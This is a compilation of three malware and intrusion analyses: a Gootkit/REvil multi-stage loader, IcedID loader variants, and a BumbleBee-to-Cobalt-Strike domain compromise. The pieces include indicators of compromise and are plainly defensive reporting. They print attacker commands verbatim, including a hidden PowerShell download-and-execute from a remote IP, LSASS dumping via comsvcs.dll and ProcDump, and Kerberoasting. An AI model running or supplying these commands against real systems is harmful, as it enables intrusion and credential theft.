The first stage (a version with cleaned formatting available here) decodes the next element: Figure 6: First stage script The decoded output is a comma-separated array of JavaScript blocks: Figure 7: Decoded comma-separated array of scripts There are four elements in the array that are referenced by their indexes.
For example, the element with the index 0 means “constructor”, 1 is another block of JavaScript code, 2 is empty, 3 is a wrapper that causes a call to a supplied code. 
Block 1 is responsible for reading/writing registry keys under “HKEY_CURRENT_USER\SOFTWARE\<script-specific name>”.
It also deobfuscates and runs another block of code: Figure 8: Third JavaScript layer This fragment of code is responsible for connecting to the C2.
It fetches the domains from the list, and tries them one by one.
If it gets a response, it runs it further. 
The above downloader script is the first stage of the loading process.
Functionality-wise it is almost identical in all the dropped files.
The differentiation between the variants starts in the next part, which is another JavaScript fetched from the C2 server. 
Stage 2 – The second JavaScript (downloaded from the C2) 
The expected response from the server is a decimal string, containing a pseudorandom marker used for validation.
It needs to be removed before further processing.
The marker consists of “@[request argument]@”. 
Figure 9: GET request with C2 server After conversion to ASCII, the next JavaScript is revealed, and the code is executed.
This JavaScript comes with an embedded PE payload which may be either a loader for Gootkit, or for the REvil ransomware.
There are also some differences in the algorithm used to deobfuscate it. 
Example for the Gootkit variant (commented, full) Figure 10: The downloaded JavaScript The downloaded code chunk is responsible for installing the persistent elements.
It also runs a Powershell script that reads the storage, decodes it and runs it further. 
Stage 3 – The stored payload and the decoding Powershell 
The authors diversified the method of encoding and storing the payload.
During our tests we observed two ways of encoding.
In one of them, the PE is stored as a Base64 encoded string, and in the other as a hexadecimal string, obfuscated by having certain numbers substituted by a pattern. 
The payload is usually stored as a list of registry keys, yet we also observed a variant in which similar content was written into a TXT file. 
Example of the payload stored in a file: Figure 11: Payload as a file on disk The content of the file is an obfuscated Powershell script that runs another Base64 obfuscated layer that finally decodes the .NET payload. 
Example of the Powershell script that runs to deobfuscate the file: "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy
Bypass -windowstyle hidden -Command "IEX (([System.IO.File]::ReadAllText('C:\Users\[username]\bkquwxd.txt')).Replace('~',''));" Below we will study two examples of the loader: One that leads to execution of the REvil ransomware, and another that leads to the execution of Gootkit. 
Example 1—Loading REvil ransomware 
The example below shows the variant in which a PE file was encoded as an obfuscated hexadecimal string.
In the analyzed case, the whole flow led to execution of REvil ransomware.
The sandbox analysis presenting this case is available here. 
Execution of the second stage JavaScript leads to the payload being written to the registry, as a list of keys.
The content is encoded as hexadecimal, and mildly obfuscated. 
Figure 12: Fragment of the payload stored in the registry, encoded as a hexadecimal string obfuscated with a pattern After writing the keys, the JavaScript deploys a PowerShell command that is responsible for decoding and running the stored content. 
Figure 13: The JS component deploys PowerShell with a Base64 encoded script Decoded content of the script: Figure 14: Decoded content It reads the content from the registry keys and deobfuscates it by substituting patterns.
In the given example, the pattern “!@#” in the hexadecimal string was substituted by “1000”, then the PE was decoded and loaded with the help of .NET
Reflection. 
The next stage PE file (.NET): REvil loader: (0e451125eaebac5760c2f3f24cc8112345013597fb6d1b7b1c167001b17d3f9f) 
The .NET loader comes with a hardcoded string that is the next stage PE: the final malicious payload.
The Setup function called by the PowerShell script is responsible for decoding and running the next PE: Figure 15: Hardcoded string (PE) Figure 16:
Deploying the payload The loader runs to the next stage with the help of Process Hollowing – one of the classic methods of PE injection. 
Figure 17: REvil ransom note Example 2 – Loading Gootkit In an other common variant, the payload is saved as Base64.
The registry keys compose a PowerShell script in the following format: $Command =[System.
Text.
Encoding]::Unicode.GetString([System.
Convert]::FromBase64String("[content]")); Invoke-Expression $Command;Start-Sleep -s 22222; Figure 18: Registry key storing payload After decoding the base64-encoded content, we get another PowerShell script: Figure 19:
More PowerShell It comes with yet another Base64-encoded piece that is further decompressed and loaded with the help of Reflection Assembly.
It is the .NET binary, similar to the previous one. 
Gootkit loader:(973d0318f9d9aec575db054ac9a99d96ff34121473165b10dfba60552a8beed4) 
The script calls a function “Install1” from the .NET module.
This function loads another PE, that is embedded inside as a base64 encoded buffer: Figure 20: Another buffer Figure 21: Deploying the payload This time the loader uses another method of PE injection, manual loading into the parent process. 
The revealed payload is a Gootkit first stage binary: 60aef1b657e6c701f88fc1af6f56f93727a8f4af2d1001ddfa23e016258e333f.
This PE is written in Delphi.
In its resources we can find another PE (327916a876fa7541f8a1aad3c2270c2aec913bc8898273d545dc37a85ef7307f ), obfuscated by XOR with a single byte.
It is further loaded by the first one. 
Loader like matryoshka dolls with a side of REvil 
The threat actors behind this campaign are using a very clever loader that performs a number of steps to evade detection.
Given that the payload is stored within the registry under a randomly-named key, many security products will not be able to detect and remove it. 
However, the biggest surprise here is to see this loader serve REvil ransomware in some instances.
We were able to reproduce this flow in our lab once, but most of the time we saw Gootkit. 
The REvil group has very strict rules for new members who must pass the test and verify as Russian.
One thing we noticed in the REvil sample we collected is that the ransom note still points to decryptor.top instead of decryptor.cc, indicating that this could be an older sample. 
Banking Trojans represent a vastly different business model than ransomware.
The latter has really flourished during the past few years and has earned criminals millions of dollars in part thanks to large ransom payments from high profile victims.
We’ve seen banking malware (i.e. Emotet) turn into loaders for ransomware where different threat actors can specialize in what they do best.
Time will tell what this return of Gootkit really means and how it might evolve. Detection and protection Malwarebytes prevents, detects and removes Gootkit and REvil via our different protection layers.
As we collect indicators of compromise we are able to block the distribution sites so that users do not download the initial loader. 
Our behavior-based anti-exploit layer also blocks the malicious loader without any signatures when the JavaScript is opened via an archiving app such as WinRar or 7-Zip. Figure 22: Blocking on script execution If a system is already infected with Gootkit, Malwarebytes can remediate the infection by cleaning up the registry entries where Gootkit hides: Figure 23: Detection of payload hidden in registry Finally, we also detect and stop the REvil (Sodinokibi) ransomware: Figure 24: REvil ransomware blocked heuristically Indicators of Compromise Compromised websites downloading JavaScript loader: docs.anscommerce[.]comellsweb[.]netentrepasteles[.]supercurro.netm-uhde[.]degames.usc[.]edudoedlinger-erdbau[.]at 3rd stage JavaScript C2s: badminton-dillenburg[.]dealona[.]org[.]cyaperosaintmartin[.]com Variant 1 (Gootkit): NET loader
[973d0318f9d9aec575db054ac9a99d96ff34121473165b10dfba60552a8beed4]Delphi PE
[60aef1b657e6c701f88fc1af6f56f93727a8f4af2d1001ddfa23e016258e333f]PE stored in resources
[327916a876fa7541f8a1aad3c2270c2aec913bc8898273d545dc37a85ef7307f] Variant 2 (REvil): NET loader [0e451125eaebac5760c2f3f24cc8112345013597fb6d1b7b1c167001b17d3f9f]Delphi PE
[d0e075a9346acbeca7095df2fc5e7c28909961184078e251f737f09b8ef892b6] – the ransomwarePE stored in resources
[a7e363887e9a7cc7f8de630b12005813cb83d6e3fc3980f735df35dccf5a1341] – a helper component The post German users targeted with Gootkit banker or REvil ransomware appeared first on Malwarebytes Labs. 
title: New IcedID variants shift from bank fraud to malware delivery url: https://www.proofpoint.com/us/newsroom/news/new-icedid-variants-shift-bank-fraud-malware-delivery New IcedID variants have been found without the usual online banking fraud functionality and instead focus on installing further malware on compromised systems. 
According to Proofpoint, these new variants have been seen used by three distinct threat actors in seven campaigns since late last year, focusing on further payload delivery, most notably ransomware. 
Proofpoint has identified two new variants of the IcedID loader, namely “Lite” (first seen in November 2022) and “Forked” (first observed in February 2023), both delivering the same IcedID bot with a more narrow-focused feature set. 
Removing unneeded functions on IcedID, which has been deployed in numerous malicious campaigns without many code changes since 2017, makes it stealthier and leaner, which can help the threat actors evade detection. 
Separate clusters of IcedID activity (Proofpoint) New IcedID campaigns Starting in November 2022, the “Lite” variant of the IcedID loader was delivered as a second-stage payload on systems infected by the newly-returned Emotet malware. 
The “Forked” version of the malware loader first appeared in February 2023, distributed directly through thousands of personalized invoice-themed phishing emails. 
These messages used Microsoft OneNote attachments (.one) to execute a malicious HTA file that, in turn, runs a PowerShell command which fetches IcedID from a remote resource.
At the same time, the victim is served a decoy PDF. 
Malicious OneNote attachment used in recent campaign (Proofpoint) 
At the end of February, Proofpoint’s researchers observed a low-volume campaign distributing IcedID “Forked” via fake notices from the National Traffic and Motor Vehicle Safety Act and the U.S. Food and Drug Administration (FDA). 
It is important to note that while some threat actors use new variants of the IcedID malware, others still choose to deploy the “Standard” variant, with one of the most recent campaigns dating March 10, 2023. 
The new variants The “Forked” IcedID loader is quite similar to the “Standard” version in terms of its role, sending basic host info to the C2 and then fetching the IcedID bot. 
However, “Forked” uses a different file type (COM Server) and features additional domain and string-decryption code, making the payload 12KB larger than the “Standard” version. 
Domains decryption (Proofpoint) On the other hand, the “Lite” loader variant is lighter, at 20KB, and does not exfiltrate host info to the C2.
This change makes sense since it was deployed alongside Emotet, which had already profiled the breached system. 
The “Forked” version of the IcedID bot is 64KB smaller than the “Standard” bot, and is basically the same malware minus the web injects system, the AiTM (adversary in the middle) functions, and the backconnect capabilities that give threat actors remote access to infected devices. 
Standard and Forked bot comparison (Proofpoint) IcedID is generally used for initial access by threat actors, so developing new variants is a worrying sign, signifying a shift towards specializing the bot to payload delivery. 
Proofpoint predicts that most threat actors will continue to use the “Standard” variant, but the deployment of new IcedID versions will likely grow, and more variants may pop up later in 2023. 
title: BumbleBee Roasts Its Way to Domain Admin url: https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/ 
In this intrusion from April 2022, the threat actors used BumbleBee as the initial access vector. 
BumbleBee is a malware loader that was first reported by Google Threat Analysis Group in March 2022.
Google TAG attributes this malware to an initial access broker (IAB) dubbed EXOTIC LILY, working with the cybercrime group FIN12/WIZARD SPIDER/DEV-0193.
Read more about BumbleBee here, and here. 
During this intrusion, the threat actors gained access using an ISO and LNK file, used several lateral movement techniques, dumped credentials three different ways, kerberoasted a domain admin account and dropped/executed a bespoke tool for discovering privilege escalation paths. 
Case Summary In this intrusion, the threat actors operated in an environment over an 11 day dwell period.
The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file. 
The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory. 
When the user double clicks or opens the lnk file, they inadvertently starts a hidden file in the directory, a DLL (namr.dll) containing the Bumblebee malware loader.
From there, the loader reached out to the Bumblebee C2 server.
At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.
This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).
From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist. 
Four hours after initial access, the threat actor started their first lateral movement using RDP to pivot to a server using the local Administrator account.
The threat actor then deployed Anydesk, which was the only observed persistence mechanism used during the intrusion.
The threat actor then started Active Directory mapping using Adfind. 
After this activity, the threat actors went silent.
Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.
The tool appeared to be still under development as several command options were not yet implemented. 
The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.
AdFind was used again as well.
Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.
They then used remote services to execute Procdump, which was used to dump lsass.
At this point, the actors appeared to be searching for more access then they currently had.
While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Administrator or similarly highly privileged account. 
After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.
Again, they executed VulnRecon and then also executed Seatbelt, a red team tool for preforming various host based discovery. 
On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.
The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.
After injecting into various processes on the host, the threat actors executed the PowerShell script Invoke-Kerberoast.
Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.
AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.
These batch scripts’ purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment. 
After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.
Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.
This service account was most likely cracked offline after being kerberoasted earlier in the intrusion. 
The threat actors were then evicted from the environment before any final actions could be taken.
We assess based on the level of access and discovery activity from the final day the likely final actions would have been a domain wide ransom deployment. 
Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.
More information on this service and others can be found here. 
We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. 
Timeline Analysis and reporting completed by @0xtornado and @MetallicHack Initial Access 
The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns. 
The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line: 
C:\Windows\System32\cmd.exe /c start rundll32 namr.dll,IternalJob Running Eric Zimmerman’s tool LECmd revealed additional details related to the threat actors.
The metadata included TA machine’s hostname, MAC address, and the LNK document creation date: Execution Execution of multiple payloads The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.
The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into: Sysmon File Created event showing wab.exe created by rundll32.exe Sysmon Event Code 1 showing wab.exe executed by WMI Execution of Cobalt Strike The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory: C:\Windows\system32\cmd.exe /C
powershell.exe -nop
-w hidden -c "IEX ((new-object net.webclient).downloadstring('http://104.243.33.50:80/a'))" Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible. 
This payload can be deobfuscated using the following CyberChef recipe: Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches') From_Base64('A-Za-z0-9+/=',true) Gunzip() Label('Decode_Shellcode') Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches') Conditional_Jump('',false,'',10) From_Base64('A-Za-z0-9+/=',true) XOR({'option':'Decimal','string':'35'},'Standard',false) Once deobfuscated, we can spot the MZRE header, which is part of the default configuration of Cobalt Strike: One of the easiest ways to extract valuable information from this Shellcode is using Didier Stevens 1768.py tool: The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co).
The full config extraction, detailing the Malleable C2 profile, is available in Command and Control section. 
Persistence AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network. 
Privilege Escalation GetSystem Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console).
The parent process of this command was C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
-s
cbdhsvc , a process where Cobalt Strike was injected into: C:\Windows\system32\cmd.exe /C
getsystem 
This command is a built-in Cobalt Strike command that is used to get SYSTEM privileges.
A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender’s Guide blog post. Valid Accounts Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain. 
A service account, with Domain Administration permissions, was used to create a remote service on a Domain Controller to move laterally. 
Defense Evasion Process Injection The process injection technique was used multiple times to inject into different processes.
Almost every post-exploitation job was launched from an injected process. 
Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe: Threat actors also created a remote thread in svchost.exe: Multiple processes were then spawned by : C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
cbdhsvc to perform various techniques (Enumeration, Credential dumping, etc.): 
A yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts as well. 
Pid ProcessName CommandLine 6832 explorer.exe C:\Windows\Explorer.
EXE 7476 svchost.exe C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
-s cbdhsvc 8088 wab.exe C:\Users\USER\AppData\Local\wab.exe 34296 
rundll32.exe C:\Windows\system32\rundll32.exe 19284 powershell.exe “c:\windows\syswow64\windowspowershell\v1.0\powershell.exe” -Version 5.1 -s
-NoLogo -NoProfile 7316 svchost.exe C:\Windows\system32\svchost.exe -k UnistackSvcGroup 7288 svchost.exe C:\Windows\system32\svchost.exe -k
UnistackSvcGroup -s
WpnUserService 20400 rundll32.exe C:\Windows\System32\rundll32.exe Indicator Removal on Host: File Deletion 
We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts. 
The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process: Credential Access LSASS Dump MiniDump Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
-s cbdhsvc beacon: cmd.exe /C
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 968 C:\ProgramData\REDACTED\lsass.dmp full ProcDump Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder: 
The ProcDump utility was executed on those workstations using the following command line: C:\programdata\procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp Kerberoasting Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected: Here is an extract of PowerShell EventID
800 showing different Invoke-Kerberoast options used by threat actors, including HashCat output format
: IEX (New-Object Net.
Webclient).DownloadString('http://127.0.0.1:36177/'); Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath C:\ProgramData\REDACTED\ps.txt -append -force -Encoding UTF8 Right after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos Service Tickets were requested from the beachhead, with ticket encryption type set to 0x17 (RC4) and ticket options to 0x40810000, to service accounts. 
Around 3 hours later, the service account logged into one of the Domain Controllers from the beachhead. 
We assess with high confidence that the service account password was weak and cracked offline by threat actors. 
Discovery Reconnaissance System Information & Software Discovery The following commands were launched by wab.exe beacon: whoami ipconfig /all tasklist systeminfo wmic product get name,version wmic /node:<REDACTED> process list brief net view \\<REDACTED>\Files$ /all dir \\<REDACTED>\C$\ Using the same beacon, wab.exe, tasklist was also used in order to enumerate processes on multiple hosts remotely: tasklist /v /s
<REMOTE_IP> Permission Groups Discovery As we have already observed in multiple cases, the threat actors enumerated the local administrators group and domain privileged (Enterprise and DAs) administrators groups mainly using net command: net use net group "Domain computers" /dom net group "Enterprise admins" /domain net group "domain admins" /domain net localgroup administrators nltest /dclist: nltest /domain_trusts ping -n 1 <REMOTE_IP> 
Opsec mistake Threat actors failed on a part of their tasks, by executing the command in the wrong console: C:\Windows\System32\rundll32.exe ➝ C :\Windows\system32\cmd.exe /C
shell whoami /all 
We can assert with high confidence that the recon stage was not fully automated, and threat actors manually executed commands and made a mistake in one of those. 
AdFind To enumerate Active Directory, the threat actors executed AdFind from the beachhead host, on three different occasions: The source of execution, the initiating parent process, was different on each occasion and the name of AdFind binary and the result files were different on one occasion, which could indicate multiple Threat actors accessing the network. 
Network scanning Threat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping the hosts and store the results in two log files: s.bat script: @echo off for /f
%%
i in (servers.txt) do for /f "tokens=2 delims=[]"
%%j in ('ping -n 1 -4
"%%i"') do @echo
%%j >> serv.log w.bat script: @echo off for /f
%%i in (workers.txt) do for /f "tokens=2 delims=[]"
j >> work.log Both of those scripts were executed from the PowerShell Cobalt Strike beacon (powershell.exe). 
Invoke-ShareFinder Invoke-ShareFinder is a PowerShell module which is part of PowerView. Invoke-ShareFinder – finds (non-standard) shares on hosts in the local domain Threat actors performed share enumeration using Invoke-ShareFinder. 
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:39303/%27); Invoke-ShareFinder -CheckShareAccess -Verbose
| Tee-Object ShareFinder.txt Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\ProgramData\. Seatbelt The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations. 
Seatbelt is a C# project that performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives. 
Threat actors performed a full reconnaissance by specifying the flag -group=all: Seatbelt.exe -group=all -outputfile="C:\ProgramData\seatinfo.txt" VulnRecon Threat actors dropped two binaries named vulnrecon.dll and vulnrecon.exe on two hosts.
This is the first time we’ve observed this tool.
This library seems to be a custom tool developed to assist threat actors with Windows local privilege escalation enumeration. 
vulnrecon.dll PDB: D:\a\_work\1\s\artifacts\obj\win-x64.Release\corehost\cli\apphost\standalone\Release\apphost.pdbvulnrecon.exe PDB: D:\work\rt\VulnRecon\VulnRecon\obj\Release\net5.0\VulnRecon.pdb The table below summarizes the capabilities of the tool: 
Option/Command Details (from the code) ‘v’ or “Vulnerability” “Search for available vulnerabilities for using LPE tools””Scans the operating system for vulnerabilities and displays a list of tools for a LPE” ‘m’ or “MicrosoftUpdates” “List of all installed microsoft updates””Displays a list installed Microsoft updates” ‘h’ or “HotFixes” “List of installed hot fixes””Displays a list of installed hot fixes” ‘s’ or “SupportedCve” “List of implemented tools for LPE “”Displays list of implemented CVE for LPE” ‘i’ or “SystemInfo” “Display information about current Windows version “ Below is the list of all of the currently supported (or implemented) CVE enumeration via installed KBs mapping: Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges.
Below are all the command lines run by the adversaries: Lateral Movement Lateral Tool Transfer Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server: The threat actors also transferred ProcDump from the beachhead to multiple workstations: Remote Services Remote Desktop Protocol Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server: Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account: This first lateral movement was performed in order to drop and install AnyDesk. 
SMB/Windows Admin Shares Remote Service over RPC Multiple RPC connections were initiated from the rundll32.exe process where wab.exe previously injected into: These RPC connections targeted multiple hosts, including workstations, servers, and DCs. 
As we can see with one server, which was targeted, the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server. 
Cobalt Strike built-in PsExec Threat actors used the built-in Cobalt Strike jump psexec command to move laterally.
On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. “<7-alphanumeric-characters>.exe”. 
Below is an example of the service edc603a that was created on a Domain Controller: 
The account used to perform this lateral movement was one of the kerberoasted service accounts. 
The random (PsExec) service runs a rundll32.exe process without any arguments.
This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion. 
We observed this beacon performing various techniques (Process injections in svchost process via CreateRemoteThread, Default named pipes, etc.) Command and Control The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into: BumbleBee 142.91.3[.]109 45.140.146[.]30 All the active Bumblebee command and control shared a common server configuration in regards to TLS setup. 
JA3: c424870876f1f2ef0dd36e7e569de906JA3s: 61be9ce3d068c08ff99a857f62352f9dCertificate:
[76:28:77:ff:fe:26:5c:e5:c6:7a:65:01:09:63:44:6d:57:b7:45:f2 ]
Not Before: 2022/04/12 06:33:52 UTC Not After: 2023/04/12 06:33:52 UTC Issuer Org: Internet Widgits
Pty Ltd Subject Org: Internet Widgits Pty Ltd Public Algorithm: rsaEncryption Cobalt Strike Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts. 
C2 Servers Two Cobalt Strike Command and Control servers were used during this intrusion.
The graph below shows beaconing activity over time, we can notice the continuous usage of the first C2 server (45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server (108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11): The main beacon wab.exe: 45.153.243[.]142 fuvataren[.]com JA3: a0e9f5d64349fb13191bc781f81f42e1JA3s: ae4edc6faf64d08308082ad26be60767Certificate:
[6c:54:cc:ce:ca:da:8b:d3:12:98:13:d5:85:52:81:8a:9d:74:4f:fb ]Not Before: 2022/04/15 00:00:00 UTC Not After: 2023/04/15 23:59:59 UTC Issuer Org: Sectigo Limited Subject Common: fuvataren.com
[fuvataren.com ,www.fuvataren.com ]Public Algorithm: rsaEncryption Below is the Cobalt Strike configuration of this C2 exported from a sandbox analysis results: access_type: 512 beacon_type: 2048 host: fuvataren.com,/rs.js http_header1: AAAAEAAAABBIb3N0OiBhbWF6b24uY29tAAAACgAAABFDb25uZWN0aW9uOiBjbG9zZQAAAAoAAAASQWNjZXB0OiBpbWFnZS9qcGVnAAAABwAAAAAAAAALAAAAAwAAAAIAAAAFSFNJRD0AAAAGAAAABkNvb2tpZQAAAAkAAAAJcmVhZD10cnVlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= http_header2: AAAAEAAAABBIb3N0OiBhbWF6b24uY29tAAAACgAAABFDb25uZWN0aW9uOiBjbG9zZQAAAAoAAAAVQWNjZXB0LUVuY29kaW5nOiBnemlwAAAACgAAAC9Db250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZAAAAAcAAAABAAAADQAAAAMAAAACAAAAB3ZhbHVlcz0AAAAEAAAABwAAAAAAAAADAAAAAgAAAA5fX3Nlc3Npb25fX2lkPQAAAAYAAAAGQ29va2llAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= http_method1: GET http_method2: POST jitter: 6144 polling_time: 5000 port_number: 443 sc_process32: %windir%\syswow64\rundll32.exe sc_process64:
%windir%\sysnative\rundll32.exe state_machine: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5eYxmuxksHBu5Hqtk11PJye1th52fYvmUXmFrL1vEIQs9+B5NI7a6bHbSHSRN1hRJN2VQ9iwpF/11IFitmWKEbFIErjX1YCy1/1Eg+EawN4l2ReZ9lz1A9wIDUtQb8fAFYRCSn72Gzb+Pax1VKLt4Kx3QJrpduOhx4q4rdvahPQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== unknown1 3.025605888e+09 unknown2 AAAABAAAAAIAAAJYAAAAAwAAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA== uri: /en user_agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/62.0.3202 watermark: 1580103814 The PowerShell beacon: 108.62.12[.]174 dofixifa[.]co JA3: a0e9f5d64349fb13191bc781f81f42e1JA3s: ae4edc6faf64d08308082ad26be60767Certificate: [ec:57:c5:ca:b1:ca:fb:88:3e:ce:1d:f3:89:0c:91:e3:1d:0a:75:ec ]Not Before: 2022/03/26 00:00:00 UTC Not After: 2023/03/26 23:59:59 UTC Issuer Org: Sectigo Limited Subject Common: dofixifa.com
[dofixifa.com ,www.dofixifa.com ]Public Algorithm: rsaEncryption Full configuration extraction using 1768.py tool: Config found: xorkey b'.'
0x00000000 0x000031e0 0x0001 payload type 0x0001 0x0002 8 windows-beacon_https-reverse_https 0x0002 port 
0x0001 0x0002 443 0x0003 sleeptime 0x0002 0x0004 5000 
0x0004 maxgetsize 0x0002 0x0004
